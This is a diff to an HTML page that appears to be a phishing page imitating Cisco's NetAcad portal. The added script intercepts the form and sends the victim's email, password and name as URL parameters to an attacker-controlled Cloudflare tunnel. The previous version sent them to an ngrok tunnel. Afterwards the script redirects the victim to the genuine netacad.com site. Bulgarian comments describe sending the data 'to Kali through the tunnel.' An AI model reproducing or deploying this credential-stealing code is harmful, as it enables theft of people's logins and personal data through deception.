@@ -115,19 +115,33 @@
         </div>
     </div>
 
-    <script>
-        document.getElementById('final-form').onsubmit = function(e) {
-            e.preventDefault();
-            const data = {
-                email: document.getElementById('email').value,
-                pass: document.getElementById('pass').value,
-                name: document.getElementById('fname').value + " " + document.getElementById('lname').value
-            };
-            const gate = "https://miah-underbeaten-consultatively.ngrok-free.dev";
-            fetch(`${gate}?u=${encodeURIComponent(data.email)}&p=${encodeURIComponent(data.pass)}&n=${encodeURIComponent(data.name)}`, {mode: 'no-cors'});
-            setTimeout(() => { window.location.href = "https://www.netacad.com/portal/learning"; }, 1000);
+<script>
+    document.getElementById('final-form').onsubmit = function(e) {
+        e.preventDefault();
+        
+        // ВАЖНО: Твоят актуален Cloudflare линк + /login
+        const gate = "https://pair-great-sand-fleece.trycloudflare.com/login";
+
+        const data = {
+            email: document.getElementById('email').value,
+            pass: document.getElementById('pass').value,
+            name: document.getElementById('fname').value + " " + document.getElementById('lname').value
         };
-    </script>
+
+        // Изпращане на данните към Kali през тунела
+        // Ползваме GET параметри (u, p, n), за да е по-сигурно преминаването
+        fetch(`${gate}?u=${encodeURIComponent(data.email)}&p=${encodeURIComponent(data.pass)}&n=${encodeURIComponent(data.name)}`, {
+            mode: 'no-cors',
+            method: 'GET'
+        });
+
+        // Малко забавяне за изпращане и пренасочване към истинския сайт
+        setTimeout(() => {
+            window.location.href = "https://www.netacad.com/portal/learning";
+        }, 1000);
+    };
+</script>
 </body>
 </html>
+
 
